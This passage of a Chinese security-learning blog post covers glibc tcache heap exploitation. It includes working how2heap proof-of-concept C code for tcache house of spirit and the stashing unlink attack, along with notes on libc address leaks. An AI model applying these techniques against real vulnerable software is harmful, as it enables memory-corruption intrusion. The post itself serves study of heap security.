+<h2 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache dup"></a>tcache dup</h2><p>类似fastbin dup。不过这次连开头的double free检查都没了，直接double free就行。</p>
+<h2 id="tcache-perthread-corruption"><a href="#tcache-perthread-corruption" class="headerlink" title="tcache perthread corruption"></a>tcache perthread corruption</h2><p>利用任意地址分配或者类似的技术直接劫持tcache_perthread_struct结构体（这个结构体也在堆上，可能部分写就可以），然后后续的small分配就全可控了。</p>
+<h2 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a>tcache house of spirit</h2><p>这位更是这位，直接放poc吧挺难绷的。就fakechunk写个size然后指针指user data直接free就行了。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates the house of spirit attack on tcache.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;It works in a similar way to original house of spirit but you don&#x27;t need to create fake chunk after the fake chunk that will be freed.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk&#x27;s size and prev_inuse are sane.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;(Search for strings \&quot;invalid next size\&quot; and \&quot;double free or corruption\&quot;)\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Ok. Let&#x27;s start with the example!.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Calling malloc() once so that it sets up its memory.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Let&#x27;s imagine we will overwrite 1 pointer to point to a fake chunk region.\n&quot;</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *a; <span class="comment">//pointer that will be overwritten</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> fake_chunks[<span class="number">10</span>]; <span class="comment">//fake chunk region</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This region contains one fake chunk. It&#x27;s size field is placed at %p\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This chunk size has to be falling into the tcache category (chunk.size &lt;= 0x410; malloc arg &lt;= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n&quot;</span>);</span><br><span class="line">    fake_chunks[<span class="number">1</span>] = <span class="number">0x40</span>; <span class="comment">// this is the size</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    a = &amp;fake_chunks[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Freeing the overwritten pointer.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n&quot;</span>, &amp;fake_chunks[<span class="number">1</span>], &amp;fake_chunks[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;malloc(0x30): %p\n&quot;</span>, <span class="built_in">malloc</span>(<span class="number">0x30</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="tcache-stashing-unlink-attack（new）"><a href="#tcache-stashing-unlink-attack（new）" class="headerlink" title="tcache stashing unlink attack（new）"></a>tcache stashing unlink attack（new）</h2><p>这是利用了在_int_malloc中，如果tcache非空且有剩余（可用calloc触发，<strong>calloc不从tcache中选取</strong>），会将扫描到的smallbin放入tcache中。而这次连接只检查了第一个bin的完整性。这个攻击可以实现类似于unsorted bin attack的效果，将一个libc地址写入任意地址。如果构造好的话也能任意地址fake chunk分配。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">    stash them in the tcache.  */</span></span><br><span class="line"> <span class="type">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line"> <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">   &#123;</span><br><span class="line">     mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">     <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	set_non_main_arena (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;<span class="comment">// attack</span></span><br><span class="line"></span><br><span class="line">      tcache_put (tc_victim, tc_idx);</span><br><span class="line">           &#125;</span><br><span class="line">&#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+<p>以how2heap的poc为例：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *chunk_lis[<span class="number">0x10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *target;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This file demonstrates the stashing unlink attack on tcache.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This poc has been tested on both glibc 2.27 and glibc 2.29.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This technique can be used when you are able to overwrite the victim-&gt;bk pointer. Besides, it&#x27;s necessary to alloc a chunk with calloc at least once. Last not least, we need a writable address to bypass check in glibc\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;The mechanism of putting smallbin into tcache in glibc gives us a chance to launch the attack.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;This technique allows us to write a libc addr to wherever we want and create a fake chunk wherever we need. In this case we&#x27;ll create the chunk on the stack.\n\n&quot;</span>);</span><br><span class="line">    <span class="comment">// stack_var emulate the fake_chunk we want to alloc to</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Stack_var emulates the fake chunk we want to alloc to.\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;First let&#x27;s write a writeable address to fake_chunk-&gt;bk to bypass bck-&gt;fd = bin in glibc. Here we choose the address of stack_var[2] as the fake bk. Later we can see *(fake_chunk-&gt;bk + 0x10) which is stack_var[4] will be a libc addr after attack.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    stack_var[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;You can see the value of fake_chunk-&gt;bk is:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">3</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Also, let&#x27;s see the initial value of stack_var[4]:%p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now we alloc 9 chunks with malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//now we malloc 9 chunks</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        chunk_lis[i] = (<span class="type">unsigned</span> <span class="type">long</span>*)<span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//put 7 tcache</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Then we free 7 of them in order to put them into tcache. Carefully we didn&#x27;t free a serial of chunks like chunk2 to chunk9, because an unsorted bin next to another will be merged into one after another malloc.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">3</span>;i &lt; <span class="number">9</span>;i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(chunk_lis[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;As you can see, chunk1 &amp; [chunk3,chunk8] are put into tcache bins while chunk0 and chunk2 will be put into unsorted bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last tcache bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">1</span>]);</span><br><span class="line">    <span class="comment">//now they are put into unsorted bin</span></span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">free</span>(chunk_lis[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//convert into small bin</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now we alloc a chunk larger than 0x90 to put chunk0 and chunk2 into small bin.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0xa0</span>);<span class="comment">//&gt;0x90</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//now 5 tcache bins</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Then we malloc two chunks to spare space for small bins. After that, we now have 5 tcache bins and 2 small bins\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now we emulate a vulnerability that can overwrite the victim-&gt;bk pointer into fake_chunk addr: %p.\n\n&quot;</span>,(<span class="type">void</span>*)stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//change victim-&gt;bck</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    chunk_lis[<span class="number">2</span>][<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)stack_var;</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//trigger the attack</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Finally we alloc a 0x90 chunk with calloc to trigger the attack. The small bin preiously freed will be returned to user, the other one and the fake_chunk were linked into tcache bins.\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x90</span>);<span class="comment">//返回chunk[0]</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;Now our fake chunk has been put into tcache bin[0xa0] list. Its fd pointer now point to next free chunk: %p and the bck-&gt;fd has been changed into a libc addr: %p\n\n&quot;</span>,(<span class="type">void</span>*)stack_var[<span class="number">2</span>],(<span class="type">void</span>*)stack_var[<span class="number">4</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//malloc and return our fake chunk on stack</span></span><br><span class="line">    target = <span class="built_in">malloc</span>(<span class="number">0x90</span>);   </span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;As you can see, next malloc(0x90) will return the region our fake chunk: %p\n&quot;</span>,(<span class="type">void</span>*)target);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>首先经过堆排布获得5个链好的tcache（2个空位）和两个small bin chunk。然后模拟UAF篡改2的bk到我们想要的fake_chunk，这个fake_chunk的bk域写了另一个可写地址target。<br>最后通过calloc触发攻击。调用calloc的时候_int_malloc将smallbin中的chunk1和2放入tcache，在这个过程中，上面<code>bck-&gt;fd=bin</code>的这一行代码会导致我们target+0x10的位置被写入一个libc地址。此时calloc返回先释放的块，chunk2被放在了tcache头。<br>由于LIFO原则，下次malloc会返回2，也就拿到了fake_chunk.</p>
+<p>可能是因为只有放进tcache后才能不检查size不检查指针的拿出来smallbin吧。另外在有tcache的情况下也可能这种攻击比unsortedbin更容易。</p>
+<h2 id="leak"><a href="#leak" class="headerlink" title="leak"></a>leak</h2><p>2.26版本之后，free的堆块会先进入tcache而不是unsorted bin，而tcache_perthread_struct在堆上不在libc数据段，因此需要先将tcache填满后再free+读才能泄露地址。</p>
+
+    </article>
+    <!-- license -->
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2024/07/26/How2Heap-7-%E2%80%94%E2%80%94Large-Bin-Attack/" title="How2Heap(7)——Large Bin Attack">
+                    <div class="prevTitle">How2Heap(7)——Large Bin Attack</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:zj_w1nd@163.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/ZjW1nd" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="https://steamcommunity.com/id/ZJwind/" class="iconfont-archer steam" target="_blank" title=steam></a>
+            
+        
+    
+        
+    
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv"><span id="busuanzi_value_site_pv"></span> readers</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AFtcache%EF%BC%9F"><span class="toc-number">1.</span> <span class="toc-text">什么是tcache？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%B3%E8%AF%B7%E5%86%85%E5%AD%98%E4%B8%8A%E7%9A%84%E6%94%B9%E5%8A%A8"><span class="toc-number">1.1.</span> <span class="toc-text">申请内存上的改动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%87%8A%E6%94%BE%E4%B8%8A%E7%9A%84%E6%94%B9%E5%8A%A8"><span class="toc-number">1.2.</span> <span class="toc-text">释放上的改动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cache%E7%9A%84%E8%A3%85%E5%85%A5%E7%AD%96%E7%95%A5"><span class="toc-number">1.3.</span> <span class="toc-text">cache的装入策略</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcache-get%E5%92%8Ctcache-put"><span class="toc-number">1.4.</span> <span class="toc-text">tcache_get和tcache_put</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E6%94%BB%E5%87%BB%EF%BC%9F"><span class="toc-number">2.</span> <span class="toc-text">怎么攻击？</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E5%8D%95%E8%A6%86%E7%9B%96tcache-poisoning"><span class="toc-number">2.1.</span> <span class="toc-text">简单覆盖tcache_poisoning</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcache-dup"><span class="toc-number">2.2.</span> <span class="toc-text">tcache dup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcache-perthread-corruption"><span class="toc-number">2.3.</span> <span class="toc-text">tcache perthread corruption</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcache-house-of-spirit"><span class="toc-number">2.4.</span> <span class="toc-text">tcache house of spirit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#tcache-stashing-unlink-attack%EF%BC%88new%EF%BC%89"><span class="toc-number">2.5.</span> <span class="toc-text">tcache stashing unlink attack（new）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#leak"><span class="toc-number">2.6.</span> <span class="toc-text">leak</span></a></li></ol></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 28
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2024 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/28</span>
+            <a class="archive-post-title" href="/2024/07/28/How2Heap-8-end-%E2%80%94%E2%80%94Tcache/">How2Heap(8)(end)——Tcache</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/26</span>
+            <a class="archive-post-title" href="/2024/07/26/How2Heap-7-%E2%80%94%E2%80%94Large-Bin-Attack/">How2Heap(7)——Large Bin Attack</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/22</span>
+            <a class="archive-post-title" href="/2024/07/22/How2Heap%E6%80%BB%E9%9B%86%E7%AF%87%E5%AF%BC%E6%BC%94%E5%89%AA%E8%BE%91%E5%89%A7%E5%9C%BA%E7%89%88/">How2Heap总集篇导演剪辑剧场版</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span>
+            <a class="archive-post-title" href="/2024/07/18/How2Heap%E5%AE%9E%E6%88%98%E2%80%94%E2%80%94CISCN2024/">How2Heap实战(1)——CISCN2024</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/11</span>
+            <a class="archive-post-title" href="/2024/07/11/CSAPP-Labs%E2%80%94%E2%80%94Malloc-Lab/">CSAPP Labs——Malloc Lab</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/04</span>
+            <a class="archive-post-title" href="/2024/07/04/CSAPP-Labs%E2%80%94%E2%80%94Attack-Lab/">CSAPP Labs——Attack Lab</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/06</span>
+            <a class="archive-post-title" href="/2024/06/06/CSAPP-Labs%E2%80%94%E2%80%94Bomb-Lab/">CSAPP Labs——Bomb Lab</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/05</span>
+            <a class="archive-post-title" href="/2024/06/05/CSAPP-Labs%E2%80%94%E2%80%94Data-Lab/">CSAPP Labs——Data Lab</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/13</span>
+            <a class="archive-post-title" href="/2024/05/13/%E7%94%B5%E8%84%91%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88%E6%95%B4%E7%90%86/">电脑问题解决方案整理</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/17</span>
+            <a class="archive-post-title" href="/2024/04/17/How2Heap-6/">How2Heap(6)——House of Roman & House of Rabbit</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/06</span>
+            <a class="archive-post-title" href="/2024/04/06/%E5%88%86%E4%BA%AB%E4%BC%9A/">分享会</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/23</span>
+            <a class="archive-post-title" href="/2024/03/23/%E6%A0%88%E6%BA%A2%E5%87%BAROP%E7%86%9F%E7%BB%83%E5%BA%A6%E6%8F%90%E5%8D%87tips/">栈溢出ROP熟练度提升tips</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/05</span>
+            <a class="archive-post-title" href="/2024/02/05/Rust-Rust-3/">Rust？Rust！(3)——自用整合终极版</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
